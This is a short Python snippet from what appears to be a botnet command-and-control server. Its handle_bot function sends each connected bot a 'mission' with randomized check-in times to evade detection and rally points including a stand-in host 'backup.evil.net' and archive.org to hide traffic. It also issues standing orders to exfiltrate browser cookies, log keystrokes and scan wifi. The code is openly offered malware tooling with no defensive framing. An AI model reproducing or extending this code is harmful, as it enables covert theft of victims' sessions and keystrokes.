# in terminus_conductor.py, the handle_bot function is upgraded

def handle_bot(conn, addr, bot_id):
    # ...
    print(f"[+] autonomous bot online: {bot_id}")
    
    # give the bot its mission
    mission = {
        "heartbeat": random.randint(1800, 7200), # vary the check-in times
        "rally_points": ["backup.evil.net:80", "archive.org:443"], # hide in plain sight
        "standing_orders": [
            {"task": "exfiltrate_browser_cookies", "priority": 1},
            {"task": "log_keystrokes", "priority": 2},
            {"task": "scan_wifi", "priority": 10}
        ]
    }
    mission_package = json.dumps({'command': 'update_mission', 'package': mission})
    conn.send(mission_package.encode())
    
    # the rest of the function can be used to receive ad-hoc data or just close
    conn.close()
    print(f"[-] bot {bot_id} received mission and went dark. will report back in {mission['heartbeat']}s.")